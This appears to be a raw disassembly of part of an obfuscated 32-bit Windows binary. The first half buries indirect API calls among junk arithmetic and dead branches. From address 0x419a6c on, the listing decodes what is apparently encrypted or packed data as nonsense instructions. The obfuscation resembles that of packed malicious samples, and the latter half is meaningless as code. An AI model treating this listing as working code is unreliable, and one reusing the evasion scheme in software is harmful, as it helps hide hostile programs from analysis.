  4194cf:	mov    DWORD PTR ds:0x428377,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x4282f3,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x4283f3,0x1b74
  4194fc:	mov    DWORD PTR ds:0x4281cf,0x3203
  419506:	cmp    DWORD PTR ds:0x428377,0x0
  41950d:	jge    0x41953e
  419513:	push   0x42810b
  419518:	push   0x4280ef
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428ee4
  419528:	adc    DWORD PTR ds:0x4281d7,0x266f
  419532:	xor    DWORD PTR ds:0x4283cf,ebx
  419538:	xor    DWORD PTR ds:0x428357,ecx
  41953e:	mov    DWORD PTR ds:0x4281c7,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x4282a3
  41954e:	dec    DWORD PTR ds:0x428357
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x428347,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x4283db,0x4283f7
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x4281df,0x0
  419589:	mov    DWORD PTR ds:0x4281cf,0x514f
  419593:	mov    DWORD PTR ds:0x4281d3,0x65eb
  41959d:	mov    DWORD PTR ds:0x428283,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x4282e3,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x4281df,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x42809d
  4195cd:	push   0x4280b9
  4195d2:	call   DWORD PTR ds:0x428ee8
  4195d8:	adc    DWORD PTR ds:0x4282f7,ecx
  4195de:	and    DWORD PTR ds:0x4282eb,0x4c04
  4195e8:	add    DWORD PTR ds:0x4281c3,ebx
  4195ee:	and    DWORD PTR ds:0x4282cf,0x6136
  4195f8:	add    DWORD PTR ds:0x4281d7,ebx
  4195fe:	mov    eax,ds:0x4225a8
  419603:	and    DWORD PTR ds:0x42835f,0x4282c7
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x4281bb,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x4281e3,0x4281b7
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x4282c7,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x4282f7,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x4282cf
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x4282e3,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x4281d3,0x4281a3
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x4282d7,0x42829f
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x4281bb
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x4281bb,0x428347
  4196ab:	push   0x42242c
  4196b0:	sbb    DWORD PTR ds:0x4282d3,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x42827b,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x42828f
  4196da:	sbb    DWORD PTR ds:0x428373,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x4282a3,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x4282bf,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x42828b,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x4283c3,0x0
  419713:	mov    edx,DWORD PTR ds:0x42833f
  419719:	mov    edx,0x8ae
  41971e:	mov    DWORD PTR ds:0x4282bb,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x4283d3,0x5836
  419737:	cmp    DWORD PTR ds:0x4283c3,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428e54
  41974d:	movzx  edx,BYTE PTR ds:0x4281bb
  419754:	adc    DWORD PTR ds:0x428343,edx
  41975a:	movzx  edx,BYTE PTR ds:0x4282f7
  419761:	add    DWORD PTR ds:0x4281db,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x4282ef,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x4281db,0x0
  419781:	mov    DWORD PTR ds:0x4282a3,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x4282bb,ebx
  419797:	cmp    DWORD PTR ds:0x4281db,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428e58
  4197bf:	sub    DWORD PTR ds:0x4282d3,0x63b8
  4197c9:	add    DWORD PTR ds:0x42834f,0x42828f
  4197d3:	add    DWORD PTR ds:0x4282af,0x4281d7
  4197dd:	mov    ebx,DWORD PTR ds:0x4281f7
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x428307
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x428287,ecx
  4197f8:	and    DWORD PTR ds:0x4282df,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x42835f
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x4281db,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x4283c7,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x428367,0x6cf
  41984e:	mov    DWORD PTR ds:0x4283f3,0x6551
  419858:	cmp    DWORD PTR ds:0x4281db,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428eec
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x4283fb
  419891:	mov    ecx,DWORD PTR ds:0x4283ff
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x4282eb
  4198a2:	cmp    DWORD PTR ds:0x4281af,0x0
  4198a9:	mov    DWORD PTR ds:0x4281a3,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x42836f
  4198ba:	not    DWORD PTR ds:0x428363
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x4281af,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428e5c
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x4282d3
  4198e5:	and    DWORD PTR ds:0x42836b,edi
  4198eb:	mov    edx,DWORD PTR ds:0x42833f
  4198f1:	sbb    DWORD PTR ds:0x4281c7,edx
  4198f7:	or     DWORD PTR ds:0x428357,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x4282c3,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x42826f
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x428273
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x428367,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x42827b,0x4551
  419946:	mov    DWORD PTR ds:0x4282df,0x487
  419950:	cmp    DWORD PTR ds:0x428367,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428e60
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
  41997e:	sbb    DWORD PTR ds:0x42833f,0x75a
  419988:	sub    DWORD PTR ds:0x4282e7,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x42828b
  419999:	sub    ecx,DWORD PTR ds:0x4283ef
  41999f:	mov    DWORD PTR ds:0x42828b,ecx
  4199a5:	cmp    DWORD PTR ds:0x4282ab,0x0
  4199ac:	mov    DWORD PTR ds:0x428343,0x47a6
  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x4281ab,0x10c7
  4199c5:	mov    DWORD PTR ds:0x4283c7,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x4282ab,edi
  4199da:	cmp    DWORD PTR ds:0x4282ab,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x428283
  4199ec:	push   0x427fab
  4199f1:	call   DWORD PTR ds:0x428ef0
  4199f7:	sub    DWORD PTR ds:0x4283f7,ecx
  4199fd:	mov    ecx,DWORD PTR ds:0x42836f
  419a03:	sbb    DWORD PTR ds:0x4282f7,ecx
  419a09:	adc    edx,DWORD PTR ds:0x4283db
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x428357,0x29fb
  419a1f:	sbb    ecx,edx
  419a21:	xor    DWORD PTR ds:0x42834f,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x428367
  419a31:	xor    DWORD PTR ds:0x42827b,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x42827f
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx+0x78708ffa]
  419a79:	mov    ds:0xbbe3b06d,al
  419a7e:	push   ss
  419a7f:	sbb    BYTE PTR [edx+edx*1+0x37401818],bh
  419a86:	popa   
  419a87:	das    
  419a88:	clc    
  419a89:	stos   BYTE PTR es:[edi],al
  419a8a:	xor    ah,BYTE PTR [eax+0x75]
  419a8d:	inc    eax
  419a8e:	xchg   ecx,eax
  419a8f:	pop    esi
  419a90:	inc    edi
  419a91:	out    dx,al
  419a92:	test   BYTE PTR [esp+ecx*2+0x60],bh
  419a96:	dec    eax
  419a97:	pop    ecx
  419a98:	ss cmp eax,0xcb94c9f4
  419a9e:	stc    
  419a9f:	pop    edx
  419aa0:	arpl   WORD PTR [ecx-0x2fb44ec3],di
  419aa6:	mov    eax,ds:0x47f728f2
  419aab:	scas   eax,DWORD PTR es:[edi]
  419aac:	or     eax,0x91b26528
  419ab1:	jo     0x419a87
  419ab3:	ret    0x160b
  419ab6:	mov    esp,0x46fa050a
  419abb:	out    0x68,al
  419abd:	fmul   st(3),st
  419abf:	or     ch,BYTE PTR [edx]
  419ac1:	xchg   ecx,eax
  419ac2:	push   esp
  419ac3:	das    
  419ac4:	adc    ebp,DWORD PTR [edi+0x78e54c2]
  419aca:	cld    
  419acb:	hlt    
  419acc:	dec    esi
  419acd:	pop    edx
  419ace:	push   eax
  419acf:	mov    bh,0xdf
  419ad1:	aam    0x62
  419ad3:	pop    ds
  419ad4:	arpl   WORD PTR [ebp+0x7e1c8722],si
  419ada:	call   0x16d5f973
  419adf:	push   ebx
  419ae0:	jnp    0x419a67
  419ae2:	cmc    
  419ae3:	imul   ebp,DWORD PTR [edx],0xb904abbc
  419ae9:	mov    ebx,0x15b75a1a
  419aee:	mov    esi,0xd9c9b654
  419af3:	xchg   ebp,eax
  419af4:	mov    eax,DWORD PTR [edx+0x35581c29]
  419afa:	xor    ebp,DWORD PTR es:[ecx+0x5b]
  419afe:	mov    fs,edi
  419b00:	adc    ecx,DWORD PTR [ebx+eiz*2]
  419b03:	push   0x29
  419b05:	cmc    
  419b06:	sub    eax,0x343aa8e6
  419b0b:	pushf  
  419b0c:	test   DWORD PTR [ecx],esp
  419b0e:	mov    bl,0xd
  419b11:	jo     0x419b86
  419b13:	or     eax,0xc296e33d
  419b18:	dec    edx
  419b19:	sbb    al,BYTE PTR [edx+0x18]
  419b1c:	fidivr WORD PTR [esi]
  419b1e:	in     al,dx
  419b1f:	push   ecx
  419b20:	sbb    dh,al
  419b22:	mov    dl,0x4d
  419b24:	push   esp
  419b25:	adc    eax,0x888436d3
  419b2a:	and    ah,BYTE PTR [esi+0x9]
  419b2d:	pop    es
  419b2e:	fisttp QWORD PTR ds:0x49e3daa6
  419b34:	dec    ebx
  419b35:	fadd   QWORD PTR [edx+0x4959e065]
  419b3b:	cmp    al,cl
  419b3d:	add    edi,edi
  419b3f:	lods   eax,DWORD PTR es:[esi]
  419b41:	ja     0x419af7
  419b43:	push   ebp
  419b44:	mov    dh,0x11
  419b46:	mov    ebp,0x45232f89
  419b4b:	or     eax,esp
  419b4d:	outs   dx,BYTE PTR ds:[esi]
  419b4e:	push   edi
  419b4f:	ret    
  419b50:	pop    eax
  419b51:	sbb    BYTE PTR [edx-0xc9284cd],0x47
  419b58:	stos   DWORD PTR es:[edi],eax
  419b59:	cmc    
  419b5a:	add    BYTE PTR [edx-0x2e2a6e67],ah
  419b60:	and    eax,0xeef6450d
  419b65:	push   ebp
  419b66:	sbb    esi,edx
  419b68:	pop    edi
  419b69:	add    DWORD PTR [edi-0x2cb8ed48],edi
  419b6f:	xor    BYTE PTR [ebp-0x2f89a6a0],cl
  419b75:	nop
  419b76:	popf   
  419b77:	xchg   ebx,eax
  419b78:	test   al,0x75
  419b7a:	icebp  
  419b7b:	cdq    
  419b7c:	dec    edi
  419b7d:	mov    ds:0x59aa11f2,eax
  419b82:	jbe    0x419baf
  419b84:	daa    
  419b85:	xchg   esi,eax
  419b86:	sahf   
  419b87:	(bad)  
  419b88:	(bad)  
  419b89:	(bad)  
  419b8a:	adc    eax,0x81f9e99a
  419b8f:	ror    dl,1
  419b91:	pusha  
  419b92:	mov    dl,0xd8
  419b94:	aas    
  419b95:	retf   0x2d70
  419b98:	(bad)  
  419b99:	sbb    al,BYTE PTR [edx-0x333507ec]
  419b9f:	in     eax,0x5c
  419ba1:	enter  0xeaa5,0xd5
  419ba5:	push   ecx
  419ba6:	jle    0x419bd0
  419ba8:	mov    cs:0x1cd0115b,eax
  419bae:	mov    bl,0x8b
  419bb0:	(bad)  
  419bb1:	xor    al,0x1d
  419bb3:	ror    DWORD PTR [eax],0x31
  419bb6:	test   DWORD PTR [edx],ebx
  419bb8:	je     0x419b94
  419bba:	sar    DWORD PTR [ebx+0x5b5148f3],cl
  419bc0:	dec    eax
  419bc1:	inc    esp
  419bc2:	pushf  
  419bc3:	imul   esp,DWORD PTR [edx+0x2b45777a],0x594218ab
  419bcd:	pop    ebp
  419bce:	into   
  419bcf:	(bad)  
  419bd0:	repnz stc 
  419bd2:	daa    
  419bd3:	sbb    eax,0x7bfa7db3
  419bd8:	push   eax
  419bd9:	leave  
  419bda:	out    dx,eax
  419bdb:	pop    es
  419bdc:	pop    ds
  419bdd:	push   edx
  419bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bdf:	adc    eax,0x8191d4ac
  419be4:	xchg   edi,eax
  419be5:	stos   DWORD PTR es:[edi],eax
  419be6:	xchg   edx,eax
  419be7:	call   0x6605:0xc48eb2a8
  419bee:	jb     0x419bb7
  419bf0:	pop    ecx
  419bf1:	aaa    
  419bf2:	adc    dh,BYTE PTR [eax]
  419bf4:	push   ds
  419bf5:	in     al,dx
  419bf6:	cli    
  419bf7:	adc    DWORD PTR [ecx],edx
  419bf9:	pop    ds
  419bfa:	out    dx,al
  419bfb:	aaa    
  419bfc:	push   esp
  419bfd:	and    ecx,DWORD PTR [ebp+0x1f02f81c]
  419c03:	add    bh,BYTE PTR [esi+0x1e]
  419c06:	addr16 popa 
  419c08:	fs fadd st(7),st
  419c0b:	popa   
  419c0c:	pop    ds
  419c0d:	inc    ebp
  419c0e:	mov    ds:0x45ef2274,eax
  419c13:	pop    ecx
  419c14:	fwait
  419c15:	(bad)  
  419c16:	mov    ebx,0x16ecd885
  419c1b:	sar    dh,cl
  419c1d:	sbb    DWORD PTR [edi],ecx
  419c1f:	inc    ecx
  419c20:	dec    edi
  419c21:	mov    dh,0xbb
  419c23:	mov    ah,0xbc
  419c25:	retf   
  419c26:	call   0x94317245
  419c2b:	push   es
  419c2c:	or     al,0x33
  419c2e:	pop    ebx
  419c2f:	cmp    ebp,ecx
  419c31:	xlat   BYTE PTR ds:[ebx]
  419c32:	(bad)  
  419c33:	pop    ss
  419c34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c35:	mov    DWORD PTR ds:0xb580245e,esi
  419c3b:	fdiv   st,st(7)
  419c3d:	mov    dl,0xde
  419c3f:	mov    ebx,DWORD PTR [esi+0x41ae22ff]
  419c45:	pop    edi
  419c46:	mov    ebx,0xaa8de02e
  419c4b:	imul   esp,DWORD PTR [edi-0x76],0xffffff90
  419c4f:	aad    0xc9
  419c51:	add    edx,edi
  419c53:	mov    esp,0x2eb4c89
  419c58:	push   ebx
  419c59:	dec    eax
  419c5a:	and    DWORD PTR [edx+0xc],0x3
  419c5e:	dec    ecx
  419c5f:	xchg   ebp,eax
  419c60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c61:	cdq    
  419c62:	push   esp
  419c63:	int    0x42
  419c65:	mov    al,ds:0x5f678afc
  419c6a:	dec    edi
  419c6b:	bound  esp,QWORD PTR [ebp+0x19]
  419c6e:	xchg   DWORD PTR [ecx-0x788d80b1],ebp
  419c74:	retf   
  419c75:	mov    ecx,0x749f143c
  419c7a:	xchg   BYTE PTR [esi-0x65],ch
  419c7d:	icebp  
  419c7e:	inc    eax
  419c7f:	xor    dh,BYTE PTR [ebx]
  419c81:	into   
  419c82:	cs inc esp
  419c84:	call   0xcd56:0xb2a16804
  419c8b:	je     0x419cb0
  419c8d:	fcmovnu st,st(7)
  419c8f:	add    ch,cl
  419c91:	hlt    
  419c92:	sar    BYTE PTR [esi-0x51],cl
  419c95:	mov    al,0xe2
  419c97:	outs   dx,DWORD PTR ds:[esi]
  419c98:	stos   BYTE PTR es:[edi],al
  419c99:	dec    esi
  419c9a:	out    dx,eax
  419c9b:	rol    esp,1
  419c9d:	sbb    DWORD PTR [ebp+0x3ffa6531],esp
  419ca3:	dec    esp
  419ca4:	ins    BYTE PTR es:[edi],dx
  419ca5:	xchg   ecx,eax
  419ca6:	or     al,BYTE PTR [eax]
  419ca8:	cli    
  419ca9:	stos   BYTE PTR es:[edi],al
  419caa:	daa    
  419cab:	aam    0x1a
  419cad:	cld    
  419cae:	pushf  
  419caf:	sahf   
  419cb0:	repnz xchg ebx,eax
  419cb2:	xchg   esi,eax
  419cb3:	cdq    
  419cb4:	fs gs jg 0x419c43
  419cb8:	mov    ecx,0xb3e9431b
  419cbd:	push   esi
  419cbe:	adc    eax,0xfc808f7
  419cc3:	mov    eax,edi
  419cc5:	cmp    ah,BYTE PTR [eax-0x201ab56a]
  419ccb:	test   BYTE PTR [eax+0x573568c0],ch
  419cd1:	xor    al,bh
  419cd3:	jae    0x419ce6
  419cd5:	pop    ss
  419cd6:	fmul   QWORD PTR [edx+0x1f6a881d]
  419cdc:	push   0xffffff8a
  419cde:	sbb    al,0x84
  419ce0:	in     al,0xc6
  419ce2:	adc    ebp,DWORD PTR [ebx-0x21]
  419ce5:	pop    ebx
  419ce6:	jae    0x419c9f
  419ce8:	call   0xb515:0xa42584f0
  419cef:	jecxz  0x419cd2
  419cf1:	cmp    al,0x5f
  419cf3:	in     al,0x64
  419cf5:	mov    esp,0xb055868c
  419cfa:	int3   
  419cfb:	popf   
  419cfc:	(bad)  
  419cfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cfe:	sub    ah,cl
  419d00:	dec    eax
  419d01:	daa    
  419d02:	shl    DWORD PTR [eax+eiz*4-0x4d331edb],0x6c
  419d0a:	pop    esi
  419d0b:	or     BYTE PTR [ebx+0x780d2614],dh
  419d11:	jbe    0x419d34
  419d13:	cmc    
  419d14:	mov    ebp,0xdd7d7fcb
  419d19:	shr    BYTE PTR [eax],cl
  419d1b:	jmp    0xea860624
  419d20:	outs   dx,DWORD PTR ds:[esi]
  419d21:	arpl   bx,bp
  419d23:	cmp    bl,BYTE PTR [esi-0x59]
  419d26:	mov    cl,0xf3
  419d28:	dec    ebx
  419d29:	push   ecx
  419d2a:	xlat   BYTE PTR ds:[ebx]
  419d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d2c:	push   ecx
  419d2d:	stc    
  419d2e:	test   BYTE PTR [edi-0x54c4c834],ah
  419d34:	inc    ebx
  419d35:	push   esi
  419d36:	pop    ebx
  419d37:	iret   
  419d38:	(bad)  
  419d39:	adc    al,BYTE PTR [edi-0x3a14d69c]
  419d3f:	out    0x89,eax
  419d41:	les    edi,FWORD PTR [ecx+ecx*4]
  419d44:	mov    bl,0x28
  419d46:	sar    DWORD PTR [eax],cl
  419d48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d49:	jmp    0x837bdf11
  419d4e:	sbb    al,0xd6
  419d50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d51:	push   0x64
  419d53:	ins    BYTE PTR es:[edi],dx
  419d54:	pusha  
  419d55:	sahf   
  419d56:	js     0x419d43
  419d58:	mov    ebx,0xf7096426
  419d5d:	cmp    al,0x4f
  419d5f:	lods   al,BYTE PTR ds:[esi]
  419d60:	dec    esp
  419d61:	and    al,0x1c
  419d63:	(bad)  
  419d64:	adc    eax,0xb53b0a5c
  419d69:	scas   eax,DWORD PTR es:[edi]
  419d6a:	aas    
  419d6b:	fcom   QWORD PTR [edi]
  419d6d:	or     al,al
  419d6f:	mov    ds:0xf80eee60,al
  419d74:	sti    
  419d75:	mov    eax,ds:0xb9438a03
  419d7a:	cmp    ch,BYTE PTR [edi]
  419d7c:	call   0x5f1c732d
  419d81:	dec    esi
  419d82:	xlat   BYTE PTR ds:[ebx]
  419d83:	add    eax,0x5803e82
  419d88:	(bad)  
  419d89:	fistp  DWORD PTR [eax+0x6bd4e254]
  419d8f:	(bad)  
  419d90:	out    0x71,al
  419d92:	(bad)  
  419d93:	jb     0x419dd0
  419d95:	(bad)  
  419d96:	push   edi
  419d97:	imul   edx,DWORD PTR [edi-0x71],0x732c3c3
  419d9e:	xor    ebx,edi
  419da0:	cmp    ah,bl
  419da2:	(bad)  [esi]
  419da4:	mov    ds:0x4c31d823,al
  419da9:	data16 ins BYTE PTR es:[edi],dx
  419dab:	jnp    0x419d82
  419dad:	imul   ebx,DWORD PTR [ecx+0x5d],0xffffff9f
  419db1:	and    BYTE PTR [ecx+0x187ec736],0x5b
  419db8:	mov    edx,0xc673d70c
  419dbd:	repnz cmp al,0x99
  419dc0:	fisub  WORD PTR [edi+ebx*1-0x12]
  419dc4:	pop    esi
  419dc5:	pop    ebp
  419dc6:	add    esp,esi
  419dc8:	sbb    BYTE PTR [edi],cl
  419dca:	xchg   ecx,eax
  419dcb:	inc    esi
  419dcd:	fmul   QWORD PTR [esi+0x1b]
  419dd0:	adc    eax,0x591bb2a4
  419dd5:	mov    WORD PTR [edx+0x20],ss
  419dd8:	fsub   DWORD PTR [edx-0x1d80dd8b]
  419dde:	cmp    BYTE PTR [edx+0x62],ch
  419de1:	inc    esp
  419de2:	inc    ecx
  419de3:	mov    edx,0x7dd75d01
  419de8:	ffree  st(1)
  419dea:	dec    ecx
  419deb:	xchg   esi,eax
  419dec:	add    cl,BYTE PTR [eax]
  419dee:	ret    
  419def:	ja     0x419d7f
  419df1:	mov    ds:0x174237f8,al
  419df6:	lods   al,BYTE PTR ds:[esi]
  419df7:	mov    WORD PTR [ecx+0x7a],gs
  419dfa:	and    ah,BYTE PTR [ebp-0x1e]
  419dfd:	shr    BYTE PTR [edi-0x47735e2d],1
  419e03:	xchg   esp,eax
  419e05:	in     al,0x79
  419e07:	pushf  
  419e08:	inc    ebp
  419e09:	push   cs
  419e0a:	cmp    BYTE PTR [eax-0x3cea9a2d],al
  419e10:	lock enterw 0x2cee,0x72
  419e16:	out    dx,eax
  419e17:	push   cs
  419e18:	inc    DWORD PTR [ebx]
  419e1a:	mov    edi,0x21560033
  419e1f:	std    
  419e20:	cmp    BYTE PTR [edi],ah
  419e22:	sub    al,0x7b
  419e24:	push   edi
  419e25:	es add al,0x37
  419e28:	fisub  WORD PTR [ebp+0x6571a41b]
  419e2e:	fs jo  0x419e7c
  419e31:	ins    DWORD PTR es:[edi],dx
  419e32:	ret    0xf674
  419e35:	aad    0x8b
  419e37:	dec    esp
  419e38:	and    al,0x14
  419e3a:	mov    edx,DWORD PTR [esp+0x30]
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0xb0ad661c
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	jno    0x419e96
  419e70:	pop    esi
  419e71:	xor    esi,esp
  419e73:	(bad)  
  419e74:	jb     0x419e75
  419e76:	sub    DWORD PTR [ebp-0xd3a77b8],ecx
  419e7c:	outs   dx,BYTE PTR ds:[esi]
  419e7d:	dec    edi
  419e7e:	(bad)  
  419e7f:	lods   al,BYTE PTR ds:[esi]
  419e80:	fsubr  st,st(6)
  419e82:	inc    edx
  419e83:	test   al,0x4d
  419e85:	cmc    
  419e86:	nop
  419e87:	call   0x4e5b:0xc16272e2
  419e8e:	sub    DWORD PTR [edx+0x37e3c441],esi
  419e94:	fst    QWORD PTR [ebx]
  419e96:	and    DWORD PTR [esi+edi*8-0x53],ebx
  419e9a:	stc    
  419e9b:	pop    esp
  419e9c:	and    DWORD PTR [ebp-0x6c],esp
  419e9f:	xchg   edi,eax
  419ea0:	pop    ebx
  419ea1:	call   0x2f22:0x6e680a95
  419ea8:	dec    ecx
  419ea9:	add    DWORD PTR [ebx-0x11cf6a30],edi
  419eaf:	test   eax,0xb557f52f
  419eb4:	pop    eax
  419eb5:	fwait
  419eb6:	sti    
  419eb7:	mov    ds:0x1c6f9086,al
  419ebc:	sub    bh,ch
  419ebe:	icebp  
  419ebf:	inc    edx
  419ec0:	jnp    0x419f10
  419ec2:	dec    ecx
  419ec3:	pusha  
  419ec4:	push   edi
  419ec5:	mov    al,0x60
  419ec7:	lea    eax,[edx+edi*2-0x58bbc25]
  419ece:	sbb    ecx,0xffffffa6
  419ed1:	pop    ss
  419ed2:	add    BYTE PTR [ebx+0x44ee56b9],0xc4
  419ed9:	sub    al,0x12
  419edb:	dec    ecx
  419edc:	shl    BYTE PTR [eax],1
  419ede:	dec    ecx
  419edf:	mov    eax,0x73520d6d
  419ee4:	or     eax,0xcf99b593
  419ee9:	inc    eax
  419eea:	sbb    dl,BYTE PTR [ecx+0x67]
  419eed:	mov    al,ds:0xc8c269d7
  419ef2:	cdq    
  419ef3:	add    DWORD PTR [esi],esp
  419ef5:	mov    dh,0xc0
  419ef7:	cmp    esp,ebp
  419ef9:	mov    ds:0xbb2bfb62,al
  419efe:	retf   
  419eff:	and    ebx,esi
  419f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f02:	std    
  419f03:	inc    ecx
  419f04:	or     eax,0x187c07fe
  419f09:	sbb    BYTE PTR [eax],dh
  419f0b:	push   0xffffffd2
